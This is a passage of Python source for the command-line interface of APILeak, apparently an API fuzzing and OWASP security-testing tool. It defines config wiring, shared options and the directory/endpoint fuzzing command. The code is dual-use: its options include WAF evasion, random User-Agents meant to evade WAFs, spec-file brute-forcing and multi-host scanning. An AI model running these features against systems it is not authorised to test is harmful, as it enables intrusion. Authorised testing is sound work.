            'backoff_factor': 2.0
        },
        'reporting': {
            'formats': ['json', 'html', 'txt'],
            'output_dir': os.getenv('APILEAK_OUTPUT_DIR', 'reports'),
            'output_filename': output_filename,
            'include_screenshots': False,
            'template_dir': 'templates'
        },
        'advanced_discovery': advanced_discovery_config,
        'http_output': {
            'status_code_filter': status_code_filter
        },
        'owasp_testing': owasp_testing,
        'ci_cd_integration': {
            'enabled': ci_mode,
            'fail_on_severity': fail_on,
            'generate_artifacts': ci_mode,
            'exit_codes': {
                'critical': 2,
                'high': 1,
                'medium': 0,
                'low': 0
            }
        },
        'secret_scan': {
            # Secret/leak detection is opt-in (Requirement 30.1); the dir/full
            # override block flips 'enabled' and sets 'patterns' when
            # --detect-secrets/--secret-patterns are supplied. Omitting
            # 'patterns' here lets SecretScanConfig fall back to the built-in
            # DEFAULT_SECRET_PATTERNS (Requirement 30.6).
            'enabled': False
        },
        'safe_mode': safe_mode
    }

    # Map --basic-auth onto the anonymous auth context as an HTTP Basic context
    # (type='basic' with username/password) so the existing
    # HTTPRequestEngine._apply_authentication branch emits a Basic Authorization
    # header on every Discovery_Request (Requirement 24.4).
    if basic_auth:
        username, password = basic_auth
        config['authentication']['contexts'][0]['type'] = 'basic'
        config['authentication']['contexts'][0]['username'] = username
        config['authentication']['contexts'][0]['password'] = password

    # Thread the transversal transport/TLS options into the config here so both
    # `dir` and `par` centralize this wiring in config creation rather than
    # patching the returned dict inline in each command body. The CLI validators
    # have already parsed/validated these before any request: the client cert
    # (str or (cert, key) tuple), the CA bundle path, and the parsed --resolve
    # (host, ip) tuple. A None value leaves the APILeakConfig default untouched
    # (load_config_from_dict reads these via ``config_data.get(...)``), so this
    # block is a no-op for callers that do not supply them and cannot regress
    # `dir`/`scan`/`full` behavior (Requirements 9.1, 9.2, 9.3).
    if client_cert is not None:
        config['client_cert'] = client_cert
    if ca_bundle is not None:
        config['ca_bundle'] = ca_bundle
    if resolve is not None:
        config['resolve'] = resolve

    # Thread the parameter-fuzzing controls into ``fuzzing.parameters.*`` so the
    # `par` path wires these through config creation (mirroring how the
    # transversal keys above are centralized) instead of patching config_dict in
    # the `par` command body. These map onto the extended ParameterFuzzingConfig
    # consumed by the ParameterFuzzer: ``methods`` drives injection-point
    # selection (R6.1), ``confirm_hits`` enables Hit_Confirmation (R5.1),
    # ``max_requests`` is the Request_Budget (R11.1), and the query/body
    # candidate sets override the file-based wordlists (R10.1, R10.2). A None
    # value leaves the dataclass default in place, so this block is inert for
    # `dir`/`scan`/`full` which never supply these arguments.
    parameters_cfg = config['fuzzing']['parameters']
    if parameter_methods is not None:
        parameters_cfg['methods'] = parameter_methods
    if confirm_hits is not None:
        parameters_cfg['confirm_hits'] = confirm_hits
    if parameter_max_requests is not None:
        parameters_cfg['max_requests'] = parameter_max_requests
    if query_candidates is not None:
        parameters_cfg['query_candidates'] = query_candidates
    if body_candidates is not None:
        parameters_cfg['body_candidates'] = body_candidates

    # Thread the three marker-mode keys into ``fuzzing.parameters.*`` for the
    # ``par`` command (Requirements 2.4, 2.5, 5.1, 7.1). These are defaulted
    # so ``dir``/``scan``/``full``/OWASP callers that never pass them are
    # completely unaffected.
    if scan_type == "par":
        parameters_cfg['fuzz_keyword'] = fuzz_keyword
        parameters_cfg['fuzz_mode'] = fuzz_mode
        parameters_cfg['marker_wordlists'] = marker_wordlists

    # For parameter fuzzing, disable endpoint discovery and use the target directly
    if scan_type == "par":
        config['fuzzing']['endpoints']['enabled'] = False

    return config


def create_default_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, extra_headers=None, basic_auth=None, client_cert=None, ca_bundle=None, resolve=None, parameter_methods=None, confirm_hits=None, parameter_max_requests=None, query_candidates=None, body_candidates=None, fuzz_keyword="FUZZ", fuzz_mode="clusterbomb", marker_wordlists=None):
    """Create a default configuration when no config file is provided (legacy compatibility)

    The trailing keyword arguments (``client_cert``/``ca_bundle``/``resolve`` and
    the ``parameter_*``/``confirm_hits``/``query_candidates``/``body_candidates``
    set) are the transversal + parameter-fuzzing keys threaded through config
    creation so the ``par`` command centralizes its wiring here rather than
    patching the returned dict inline. They all default to None, so existing
    positional callers (``dir``/``scan``/``full`` and the tests) are unaffected.
    The three marker-mode keys (``fuzz_keyword``, ``fuzz_mode``,
    ``marker_wordlists``) mirror ``EndpointFuzzingConfig``'s shape and are only
    written under ``config_dict['fuzzing']['parameters']`` for ``scan_type=="par"``,
    so all other commands are unaffected (Requirements 2.4, 2.5, 5.1, 7.1).
    """
    return create_enhanced_config(target_url, wordlist_path, scan_type, user_agent_config, output_filename, advanced_config, status_code_filter, False, "critical", False, extra_headers, basic_auth, None, None, client_cert, ca_bundle, resolve, parameter_methods, confirm_hits, parameter_max_requests, query_candidates, body_candidates, fuzz_keyword, fuzz_mode, marker_wordlists)


# ---------------------------------------------------------------------------
# Shared CLI option decorator stacks
# ---------------------------------------------------------------------------
#
# These reusable Click decorator stacks group the transversal request-context,
# resilience, concurrency, TLS-transport, matcher/filter, and machine-output
# options so they can be applied identically to multiple commands (starting
# with ``dir``; ``par`` gains parity in a later task) without duplicating the
# option names, help text, defaults, or validator callbacks.
#
# Each stack applies its options bottom-up so that when it is used as a single
# decorator the resulting option display/registration order matches the order
# in which the options are written here (top to bottom).


def request_context_options(f):
    """Shared request-context options: ``--header``/``-H``, ``--cookie``, ``--basic-auth``."""
    f = click.option('--basic-auth', 'basic_auth', metavar='user:pass',
                     help='HTTP Basic credentials (user:pass) sent as an Authorization header on every discovery request.')(f)
    f = click.option('--cookie', 'cookie', metavar='COOKIE',
                     help='Raw Cookie header string applied to every discovery request.')(f)
    f = click.option('--header', '-H', 'header', multiple=True, metavar='"Name: Value"',
                     help='Custom header applied to every discovery request, "Name: Value" format. Repeatable.')(f)
    return f


def resilience_options(f):
    """Shared resilience options: ``--timeout``, ``--retries``."""
    f = click.option('--retries', 'retries', type=int, default=None, callback=_validate_retries,
                     help='Number of automatic retries for each failed discovery request '
                          '(must be >= 0; default: 2).')(f)
    f = click.option('--timeout', 'timeout', type=float, default=None, callback=_validate_timeout,
                     help='Per-request timeout in seconds applied to every discovery request '
                          '(must be > 0; default: 10).')(f)
    return f


def concurrency_options(f):
    """Shared concurrency options: ``--max-requests``, ``--concurrency``."""
    f = click.option('--concurrency', 'concurrency', type=int, default=None, callback=_validate_concurrency,
                     help='Max concurrent in-flight discovery requests (default: 50).')(f)
    f = click.option('--max-requests', 'max_requests', type=int, default=None, callback=_validate_max_requests,
                     help='Global request budget for discovery (default: unbounded).')(f)
    return f


def tls_options(f):
    """Shared TLS-transport options: ``--client-cert``, ``--ca-bundle``, ``--resolve``."""
    f = click.option('--resolve', 'resolve', metavar='host:ip', default=None, callback=_validate_resolve,
                     help='Override DNS resolution for the named host to the supplied IP for every '
                          'discovery request (e.g. api.example.com:127.0.0.1).')(f)
    f = click.option('--ca-bundle', 'ca_bundle', metavar='PATH', default=None, callback=_validate_ca_bundle,
                     help='Custom CA bundle used to verify target certificates for every discovery request.')(f)
    f = click.option('--client-cert', 'client_cert', metavar='PATH[:KEY]', default=None, callback=_validate_client_cert,
                     help='Client certificate for mutual TLS, presented on every discovery request. '
                          'A combined cert+key PEM PATH, or a cert:key pair of paths.')(f)
    return f


def matcher_filter_options(f):
    """Shared response matcher/filter options: ``--match-*`` and ``--filter-*``."""
    f = click.option('--filter-time', 'filter_time', multiple=True, metavar='EXPR',
                     help='Exclude results whose response time (seconds) satisfies EXPR. Repeatable.')(f)
    f = click.option('--filter-regex', 'filter_regex', multiple=True, metavar='REGEX',
                     help='Exclude results whose response body matches the regular expression REGEX. Repeatable.')(f)
    f = click.option('--filter-lines', 'filter_lines', multiple=True, metavar='EXPR',
                     help='Exclude results whose response line count satisfies EXPR. Repeatable.')(f)
    f = click.option('--filter-words', 'filter_words', multiple=True, metavar='EXPR',
                     help='Exclude results whose response word count satisfies EXPR. Repeatable.')(f)
    f = click.option('--filter-size', 'filter_size', multiple=True, metavar='EXPR',
                     help='Exclude results whose response body size (bytes) satisfies EXPR. Repeatable.')(f)
    f = click.option('--match-time', 'match_time', multiple=True, metavar='EXPR',
                     help='Match results whose response time (seconds) satisfies EXPR. Repeatable.')(f)
    f = click.option('--match-regex', 'match_regex', multiple=True, metavar='REGEX',
                     help='Match results whose response body matches the regular expression REGEX. Repeatable.')(f)
    f = click.option('--match-lines', 'match_lines', multiple=True, metavar='EXPR',
                     help='Match results whose response line count satisfies EXPR. Repeatable.')(f)
    f = click.option('--match-words', 'match_words', multiple=True, metavar='EXPR',
                     help='Match results whose response word count satisfies EXPR. Repeatable.')(f)
    f = click.option('--match-size', 'match_size', multiple=True, metavar='EXPR',
                     help='Match results whose response body size (bytes) satisfies EXPR (e.g. >100, <50, 10-20, 200). Repeatable.')(f)
    return f


def machine_output_options(f):
    """Shared machine-readable output options: ``--output-format``, ``--output-file``."""
    f = click.option('--output-file', 'output_file', type=click.Path(),
                     help='Destination path for the machine-readable output (extension selects the format)')(f)
    f = click.option('--output-format', 'output_format', type=click.Choice(['csv', 'jsonl']),
                     help='Write a machine-readable discovery output in the selected format (csv or jsonl)')(f)
    return f


@click.group()
@click.option('--no-banner', is_flag=True, help='Suppress banner output')
@click.pass_context
def cli(ctx, no_banner):
    """APILeak v0.2.1 - Enterprise API Fuzzing Tool

    \b
    Performs comprehensive security testing of APIs including:
    • Traditional endpoint and parameter fuzzing
    • OWASP API Security Top 10 testing
    • Advanced vulnerability detection with framework detection
    • Version fuzzing and subdomain discovery
    • WAF detection and evasion techniques
    • Advanced payload encoding and obfuscation
    • CORS analysis and security headers testing
    • Multi-format reporting with CI/CD integration
    • JWT token manipulation and analysis

    \b
    Discovery & fuzzing:
      python apileaks.py dir --target URL              # Directory/endpoint fuzzing
      python apileaks.py par --target URL              # Parameter fuzzing

    \b
    OWASP API Security Top 10:
      python apileaks.py owasp                          # List every OWASP module
      python apileaks.py owasp bola --target URL        # Run a single module (isolated)
      python apileaks.py owasp auth --target URL        # Run only the Auth module
      python apileaks.py scan --target URL              # Orchestrated scan (all modules)
      python apileaks.py scan --target URL --modules bola,auth   # Selected modules

    \b
    Advanced examples:
      python apileaks.py scan --target URL --enable-advanced
      python apileaks.py scan --target URL --detect-framework --fuzz-versions
      python apileaks.py scan --target URL --user-agent-random --enable-waf-evasion

    \b
    CI/CD integration (severity gate, SARIF, baseline):
      python apileaks.py scan --target URL --ci-mode --fail-on high --sarif

    \b
    JWT utilities (manual toolkit):
      python apileaks.py jwt decode TOKEN
      python apileaks.py jwt encode '{"sub":"user"}' --secret key
      python apileaks.py jwt --help                     # Full JWT toolkit listing
    """
    ctx.ensure_object(dict)
    ctx.obj['no_banner'] = no_banner

    # Print banner unless suppressed or showing help
    if not no_banner and ctx.info_name != 'help':
        print_banner()


@cli.command()
@click.option('--target', '-t', required=False, default=None,
              help='Target URL to scan. Required unless --target-file is supplied.')
@click.option('--wordlist', '-w', 'wordlist', multiple=True,
              help='Wordlist file for directory fuzzing. Repeatable; merged and '
                   'de-duplicated across all values. Use "-" to read entries from stdin.')
@click.option('--openapi', 'openapi', multiple=True, type=click.Path(),
              help='OpenAPI/Swagger document (JSON or YAML) to seed discovery from. Repeatable.')
@click.option('--postman', 'postman', multiple=True, type=click.Path(),
              help='Postman collection to seed discovery from. Repeatable.')
@click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']),
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.option('--methods', default='GET,POST,PUT,DELETE,PATCH',
              help='HTTP methods to test (comma-separated)')
@click.option('--fuzz-keyword', 'fuzz_keyword', default='FUZZ', show_default=True,
              metavar='KEYWORD',
              help='Literal token in the target URL marking positions to fuzz. '
                   'Every occurrence becomes a marker; choose a distinct value to '
                   'avoid colliding with legitimate URL text. In marker mode the '
                   'repeatable --wordlist values are the per-marker wordlists in '
                   'marker order.')
@click.option('--fuzz-mode', 'fuzz_mode',
              type=click.Choice(['clusterbomb', 'pitchfork'], case_sensitive=False),
              default='clusterbomb', show_default=True,
              help='How multiple markers combine their wordlists: clusterbomb '
                   '(cartesian product) or pitchfork (index-wise zip).')
@click.option('--depth', 'depth', type=int, default=None, callback=_validate_depth,
              help='Max recursion depth for discovery (0 = no recursion). '
                   'Overrides APILEAK_MAX_DEPTH and the config default (3).')
@click.option('--recursive/--no-recursive', 'recursive', default=None,
              help='Enable or disable recursive discovery (default: enabled).')
@concurrency_options
@click.option('--confirm-hits', 'confirm_hits', type=int, default=None, callback=_validate_confirm_hits,
              metavar='N',
              help='Enable Hit_Confirmation: re-request each interesting candidate N times '
                   'and record it only when the responses are consistent (must be >= 1; '
                   'default: off).')
@resilience_options
@click.option('--extensions', '-x', 'extensions', multiple=True, metavar='EXT',
              help='File extensions to append to each wordlist entry (comma-separated, repeatable). '
                   'e.g. -x json,php or -x .json -x .php. Leading dots are optional.')
@click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
@click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
@click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
@click.option('--jwt', help='JWT token to use for authentication')
@request_context_options
@click.option('--enumerate-methods', 'enumerate_methods', is_flag=True, default=False,
              help='Enumerate allowed HTTP methods per discovered endpoint via an OPTIONS '
                   'request (parses the Allow header; default: off).')
@click.option('--graphql', 'graphql', is_flag=True, default=False,
              help='Probe common GraphQL paths against the target and report whether '
                   'introspection is enabled (read-only introspection query; default: off).')
@click.option('--response', help='Filter by response codes (e.g., 200,301,404 or 200-300)')
@click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
@matcher_filter_options
@click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection during directory fuzzing')
@click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing during directory discovery')
@click.option('--save-session', 'save_session', type=click.Path(), help='Save discovery results to a JSON session file (source of truth for reload)')
@click.option('--load-session', 'load_session', type=click.Path(), help='Reload discovery results exclusively from a JSON session file (skips discovery)')
@click.option('--checkpoint', 'checkpoint', type=click.Path(), help='Periodically write a discovery checkpoint to PATH so an interrupted run can be resumed (atomic writes)')
@click.option('--resume', 'resume', type=click.Path(), help='Resume an interrupted discovery run from the discovery checkpoint at PATH (loaded before discovery; combine with --checkpoint to keep checkpointing)')
@click.option('--export', 'export_format', type=click.Choice(['md', 'txt']), help='Write a human-readable discovery export in the selected format (md or txt)')
@click.option('--export-file', 'export_file', type=click.Path(), help='Destination path for the human-readable export (extension selects the format)')
@machine_output_options
@click.option('--interactive', '--triage', 'interactive', is_flag=True, help='Enable interactive triage mode (opt-in; auto-disabled in CI mode)')
@click.option('--scan-scope', 'scan_scope', metavar='SCOPE', default=None,
              help='Non-interactively define a Batch_Scan_Scope as all discovered records of a '
                   'Status_Code_Class (2xx, 3xx, 4xx, 5xx) or an EndpointStatus (valid, '
                   'auth_required) and run an OWASP scan over them. In CI mode this is the only '
                   'way to define the scan scope (the interactive prompt never runs).')
@click.option('--ci-mode', 'ci_mode', is_flag=True, help='Enable CI mode (disables the interactive triage prompt so it never blocks a pipeline)')
@click.option('--proxy', help='Route all HTTP traffic through an intercepting proxy (e.g. Burp/Caido/Hetty: http://127.0.0.1:8080). TLS verification is disabled by default for proxied HTTPS targets. SOCKS5 proxies with auth are supported, e.g. socks5://user:pass@host:port.')
@click.option('--proxy-verify-ssl', 'proxy_verify_ssl', is_flag=True, help='Keep TLS certificate verification enabled when using --proxy (use after installing the proxy CA).')
@tls_options
@click.option('--allow-cross-domain-redirects', 'allow_cross_domain_redirects', is_flag=True, default=False,
              help='Follow redirects to other domains during discovery. By default discovery '
                   'follows redirects only to the same domain as the originating request.')
@click.option('--detect-secrets', 'detect_secrets', is_flag=True, default=False,
              help='Scan each discovery response body and headers for secrets/leaked '
                   'credentials (read-only; default: off). Matched values are redacted.')
@click.option('--secret-patterns', 'secret_patterns', metavar='PATH', default=None,
              callback=_validate_secret_patterns,
              help='Path to a JSON file mapping pattern names to regex strings used for '
                   'secret detection. Defaults to the built-in patterns when not supplied.')
@click.option('--include-path', 'include_path', multiple=True, metavar='REGEX',
              help='Only persist discovered endpoints whose path or URL matches REGEX '
                   '(storage-time scope). Repeatable. Exclude takes precedence over include.')
@click.option('--exclude-path', 'exclude_path', multiple=True, metavar='REGEX',
              help='Never persist discovered endpoints whose path or URL matches REGEX '
                   '(storage-time scope). Repeatable. Takes precedence over --include-path.')
@click.option('--include-status', 'include_status', metavar='SELECTION', default=None,
              help='Only persist discovered endpoints whose status matches SELECTION: a '
                   "status class like '2xx' or explicit codes/ranges like '200,404' or "
                   "'200-300' (storage-time scope).")
@click.option('--exclude-status', 'exclude_status', metavar='SELECTION', default=None,
              help='Never persist discovered endpoints whose status matches SELECTION: a '
                   "status class like '2xx' or explicit codes/ranges like '200,404' or "
                   "'200-300' (storage-time scope). Takes precedence over --include-status.")
@click.option('--recursion-status', 'recursion_status', metavar='CLASSES', default=None,
              help='Restrict recursion to endpoints whose status class is in CLASSES: a '
                   "comma-separated list of status classes like '2xx,3xx'. Only narrows the "
                   'default VALID/AUTH_REQUIRED recursion; never relaxes it.')
@click.option('--recursion-type', 'recursion_type', metavar='TYPES', default=None,
              help='Restrict recursion to endpoints whose type is in TYPES: a comma-separated '
                   "list of endpoint types like 'admin,api_version'. Only narrows the default "
                   'recursion; never relaxes it.')
@click.option('--spec-methods-only', 'spec_methods_only', is_flag=True, default=False,
              help='When an OpenAPI/Postman spec is supplied, probe each path with ONLY '
                   'the HTTP method(s) declared in the spec — the base --methods set is '
                   'ignored for spec-seeded paths. Paths from the wordlist that are not '
                   'in the spec continue using --methods as before.')
@click.option('--quarantine-threshold', 'quarantine_threshold', type=int, default=None,
              metavar='N',
              help='Halt discovery after N consecutive non-404 responses — the host is '
                   'likely responding to every path (wildcard). Set to 0 to disable. '
                   'Default: 10.')
@click.option('--target-file', 'target_file', default=None,
              type=click.Path(exists=True, readable=True, file_okay=True, dir_okay=False),
              metavar='FILE',
              help='Path to a plain-text file with one target URL per line (comments '
                   'starting with # and blank lines are skipped). When supplied, '
                   '--target is optional and each line is scanned in sequence. '
                   'Lines without a scheme are auto-prefixed with https://.')
@click.option('--max-hosts', 'max_hosts', type=int, default=None, metavar='N',
              help='Maximum number of hosts to scan from --target-file (scans the first N).')
@click.option('--parallel-hosts', '-j', 'parallel_hosts', type=int, default=1,
              metavar='N',
              help='Maximum number of hosts to scan concurrently from --target-file. '
                   'Each host runs in its own thread. Default: 1 (sequential).')
# ── Spec-file brute-force options (equivalent to `sj brute`) ─────────────────
@click.option('--brute-spec', 'brute_spec', is_flag=True, default=False,
              help='Brute-force common paths to find exposed API specification files '
                   '(Swagger, OpenAPI, RAML, AsyncAPI, etc.). Runs instead of normal '
                   'directory fuzzing when set. Equivalent to `sj brute`.')
@click.option('--brute-spec-wordlist', 'brute_spec_wordlist', default=None,
              type=click.Path(exists=True, readable=True),
              metavar='FILE',
              help='Custom wordlist for spec-brute mode (one path per line). '
                   'Defaults to the built-in wordlists/spec_files.txt.')
@click.option('--brute-spec-extensions', 'brute_spec_extensions', is_flag=True, default=False,
              help='Append .json/.yaml/.yml to every wordlist entry during spec-brute, '
                   'tripling coverage at the cost of more requests.')
@click.option('--brute-spec-concurrency', 'brute_spec_concurrency', type=int, default=20,
              metavar='N',
              help='Max concurrent requests during spec-brute (default: 20).')
@click.option('--brute-spec-output', 'brute_spec_output', default=None,
              type=click.Path(),
              metavar='FILE',
              help='Write spec-brute results to a JSON file.')
@click.pass_context
def dir(ctx, target, wordlist, openapi, postman, output, log_level, log_file, json_logs, rate_limit, methods, fuzz_keyword, fuzz_mode, depth, recursive, max_requests, concurrency, confirm_hits, timeout, retries, extensions, user_agent_random, user_agent_custom, user_agent_file, jwt, header, cookie, basic_auth, enumerate_methods, graphql, response, status_code, match_size, match_words, match_lines, match_regex, match_time, filter_size, filter_words, filter_lines, filter_regex, filter_time, detect_framework, fuzz_versions, save_session, load_session, checkpoint, resume, export_format, export_file, output_format, output_file, interactive, scan_scope, ci_mode, proxy, proxy_verify_ssl, client_cert, ca_bundle, allow_cross_domain_redirects, resolve, detect_secrets, secret_patterns, include_path, exclude_path, include_status, exclude_status, recursion_status, recursion_type, spec_methods_only, quarantine_threshold, target_file, max_hosts, parallel_hosts, brute_spec, brute_spec_wordlist, brute_spec_extensions, brute_spec_concurrency, brute_spec_output):
    """Directory/endpoint fuzzing - discover hidden endpoints and directories

    \b
    Examples:
      python apileaks.py dir --target https://api.example.com
      python apileaks.py dir --target URL --wordlist custom.txt --rate-limit 5
      python apileaks.py dir --target URL --user-agent-random --detect-framework
      python apileaks.py dir --target URL --save-session session.json --export md --export-file results.md
      python apileaks.py dir --target URL --load-session session.json --status-code 2xx
      python apileaks.py dir --target URL --load-session session.json --interactive
      python apileaks.py dir --target URL --interactive --ci-mode --save-session session.json
      python apileaks.py dir --target URL --proxy http://127.0.0.1:8080 --jwt TOKEN
      python apileaks.py dir --target-file hosts.txt --wordlist custom.txt
      python apileaks.py dir --target-file hosts.txt --max-hosts 50 --proxy http://127.0.0.1:8080

    \b
    Spec-file brute-force (equivalent to `sj brute`):
      python apileaks.py dir --target https://api.example.com --brute-spec
      python apileaks.py dir --target URL --brute-spec --proxy http://127.0.0.1:8080
      python apileaks.py dir --target URL --brute-spec --brute-spec-extensions
      python apileaks.py dir --target URL --brute-spec --brute-spec-wordlist custom_spec_paths.txt
      python apileaks.py dir --target URL --brute-spec --brute-spec-output results.json
    """

    # ── Spec-file brute-force mode (--brute-spec) ────────────────────────────
    # When --brute-spec is set, skip normal directory fuzzing entirely and run
    # the spec-file discovery engine instead. This is the apileaks equivalent
    # of `sj brute -u https://target.com`.
    if brute_spec:
        # Resolve target — required for brute-spec mode.
        brute_target = target
        if not brute_target and target_file:
            try:
                file_targets = parse_target_file(target_file)
            except click.BadParameter as exc:
                click.echo(f"Error: {exc}", err=True)
                sys.exit(1)
            brute_target = file_targets[0] if file_targets else None
        if not brute_target:
            click.echo(
                "Error: --brute-spec requires --target (or --target-file with at least one URL).",
                err=True,
            )
            sys.exit(1)

        no_banner = ctx.obj.get("no_banner", False) if ctx.obj else False
        if not no_banner:
            print_banner()

        _run_spec_brute(
            brute_target,
            brute_spec_wordlist=brute_spec_wordlist,
            brute_spec_extensions=brute_spec_extensions,
            proxy=proxy,
            timeout=timeout or 10.0,
            concurrency=brute_spec_concurrency,
            verify_ssl=not bool(proxy) or proxy_verify_ssl,
            jwt=jwt,
            header=header,
            user_agent_random=user_agent_random,
            user_agent_custom=user_agent_custom,
            output_file=brute_spec_output,
            quiet=ci_mode,
            logger=get_logger("brute-spec"),
        )
        return
    # ── End brute-spec mode ──────────────────────────────────────────────────

    # -------------------------------------------------------------------------
    # Multi-target resolution: build the ordered list of targets to scan.
    #
    # Priority: --target-file wins over --target when both are supplied (the
    # file may contain --target as well; --target becomes an implicit first
    # entry when --target-file is not used).
    #
    # --target is required unless --target-file is supplied.  We enforce this
    # manually here (Click's required=False allows both to be absent) so the
    # error message is user-friendly.
    # -------------------------------------------------------------------------
    if target_file:
        try:
            file_targets = parse_target_file(target_file)
        except click.BadParameter as exc:
            click.echo(f"Error: {exc}", err=True)
            sys.exit(1)
        if not file_targets:
            click.echo(f"Error: --target-file '{target_file}' contains no valid targets.", err=True)
            sys.exit(1)
        # Prepend a CLI --target when explicitly supplied alongside --target-file
        if target:
            all_targets = [target] + [t for t in file_targets if t != target]
        else:
            all_targets = file_targets
        if max_hosts is not None and max_hosts > 0:
            all_targets = all_targets[:max_hosts]
    elif target:
        all_targets = [target]
    else:
        click.echo(
            "Error: Either --target or --target-file must be supplied.\n"
            "  --target URL            scan a single host\n"
            "  --target-file FILE      scan every host listed in FILE",
            err=True,
        )
        sys.exit(1)

    # When there are multiple targets, run each one sequentially and print a
    # consolidated summary at the end.  Single-target runs go straight through
    # the existing code path without any extra wrapping so nothing changes.

    # Compute whether a marker-only option was explicitly supplied on the CLI.
    # ctx.get_parameter_source is only available here (in the Click command
    # function), so we resolve it once and forward it to _run_dir_core /
    # _run_dir_multi_target.
    marker_only_requested = (
        ctx.get_parameter_source('fuzz_keyword')
        == click.core.ParameterSource.COMMANDLINE
        or ctx.get_parameter_source('fuzz_mode')
        == click.core.ParameterSource.COMMANDLINE
    )

    if len(all_targets) > 1:
        _run_dir_multi_target(
            targets=all_targets,
            ctx=ctx,
            # Forward every option unchanged
            wordlist=wordlist, openapi=openapi, postman=postman, output=output,
            log_level=log_level, log_file=log_file, json_logs=json_logs,
            rate_limit=rate_limit, methods=methods, fuzz_keyword=fuzz_keyword,
            fuzz_mode=fuzz_mode, depth=depth, recursive=recursive,
            max_requests=max_requests, concurrency=concurrency,
            confirm_hits=confirm_hits, timeout=timeout, retries=retries,
            extensions=extensions, user_agent_random=user_agent_random,
            user_agent_custom=user_agent_custom, user_agent_file=user_agent_file,
            jwt=jwt, header=header, cookie=cookie, basic_auth=basic_auth,
            enumerate_methods=enumerate_methods, graphql=graphql,
            response=response, status_code=status_code,
            match_size=match_size, match_words=match_words, match_lines=match_lines,
            match_regex=match_regex, match_time=match_time,
            filter_size=filter_size, filter_words=filter_words,
            filter_lines=filter_lines, filter_regex=filter_regex,
            filter_time=filter_time, detect_framework=detect_framework,
            fuzz_versions=fuzz_versions, save_session=save_session,
            load_session=load_session, checkpoint=checkpoint, resume=resume,
            export_format=export_format, export_file=export_file,
            output_format=output_format, output_file=output_file,
            interactive=False,          # never interactive in multi-target mode
            scan_scope=scan_scope, ci_mode=ci_mode, proxy=proxy,
            proxy_verify_ssl=proxy_verify_ssl, client_cert=client_cert,
            ca_bundle=ca_bundle,
            allow_cross_domain_redirects=allow_cross_domain_redirects,
            resolve=resolve, detect_secrets=detect_secrets,
            secret_patterns=secret_patterns, include_path=include_path,
            exclude_path=exclude_path, include_status=include_status,
            exclude_status=exclude_status, recursion_status=recursion_status,
            recursion_type=recursion_type, spec_methods_only=spec_methods_only,
            quarantine_threshold=quarantine_threshold,
            marker_only_requested=marker_only_requested,
            parallel_hosts=parallel_hosts,
        )
        return

    # Single-target: reassign `target` from the resolved list so the rest of
    # the function uses exactly this value regardless of how it was supplied.
    target = all_targets[0]

    # Delegate to _run_dir_core which contains the full single-target pipeline.
    _single_result = _run_dir_core(
        target=target, ctx=ctx,
        wordlist=wordlist, openapi=openapi, postman=postman, output=output,
        log_level=log_level, log_file=log_file, json_logs=json_logs,
        rate_limit=rate_limit, methods=methods, fuzz_keyword=fuzz_keyword,
        fuzz_mode=fuzz_mode, depth=depth, recursive=recursive,
        max_requests=max_requests, concurrency=concurrency,
        confirm_hits=confirm_hits, timeout=timeout, retries=retries,
        extensions=extensions, user_agent_random=user_agent_random,
        user_agent_custom=user_agent_custom, user_agent_file=user_agent_file,
        jwt=jwt, header=header, cookie=cookie, basic_auth=basic_auth,
        enumerate_methods=enumerate_methods, graphql=graphql,
        response=response, status_code=status_code,
        match_size=match_size, match_words=match_words, match_lines=match_lines,
        match_regex=match_regex, match_time=match_time,
        filter_size=filter_size, filter_words=filter_words,
        filter_lines=filter_lines, filter_regex=filter_regex,
        filter_time=filter_time, detect_framework=detect_framework,
        fuzz_versions=fuzz_versions, save_session=save_session,
        load_session=load_session, checkpoint=checkpoint, resume=resume,
        export_format=export_format, export_file=export_file,
        output_format=output_format, output_file=output_file,
        interactive=interactive, scan_scope=scan_scope, ci_mode=ci_mode,
        proxy=proxy, proxy_verify_ssl=proxy_verify_ssl,
        client_cert=client_cert, ca_bundle=ca_bundle,
        allow_cross_domain_redirects=allow_cross_domain_redirects,
        resolve=resolve, detect_secrets=detect_secrets,
        secret_patterns=secret_patterns, include_path=include_path,
        exclude_path=exclude_path, include_status=include_status,
        exclude_status=exclude_status, recursion_status=recursion_status,
        recursion_type=recursion_type, spec_methods_only=spec_methods_only,
        quarantine_threshold=quarantine_threshold,
        marker_only_requested=marker_only_requested,
    )
    # Propagate errors from _run_dir_core so single-target failures still
    # exit non-zero (matches pre-refactor behavior where click.echo + sys.exit
    # were called directly in the command body).
    if _single_result and _single_result.get("error"):
        click.echo(f"Error: {_single_result['error']}", err=True)
        sys.exit(1)

def _build_discovery_progress(ci_mode, max_requests):
    """Build the live Progress_Display for the ``dir`` command (Requirement 32).

    The display is enabled only for an interactive session that is **not** in
    CI_Mode and whose standard output is a TTY:
    ``enabled = (not ci_mode) and sys.stdout.isatty()`` — the exact gating that
    governs the interactive triage prompt. This disables it in CI_Mode
    (Requirement 32.3) and when stdout is not a TTY so it never interferes with
    piped output (Requirement 32.4). ``total`` is the Request_Budget
    (``max_requests``); when ``None`` the display omits the consumed/remaining
    budget figures (Requirement 32.5).
    """
    enabled = (not ci_mode) and sys.stdout.isatty()
    return DiscoveryProgress(enabled=enabled, total=max_requests)


def _echo_discovery_control_status(core):
    """Surface discovery recursion-control flags in the discovery summary.

    Reports when the Request_Budget was reached (Requirement 18.5), when
    Catch_All_Response behavior was detected (Requirement 19.5), and when a
    GraphQL endpoint with introspection enabled was detected (Requirement 27.4).
    The values are read defensively via :meth:`APILeakCore.get_discovery_status`,
    so the summary stays silent unless a flag is set (including before the
    underlying fuzzer attributes exist).
    """
    status = core.get_discovery_status()
    if status.get("budget_reached"):
        click.echo(
            "⚠️  Request budget reached: discovery stopped early, "
            "results may be partial"
        )
    if status.get("catch_all_detected"):
        click.echo(
            "⚠️  Catch-all response detected: wildcard endpoints excluded "
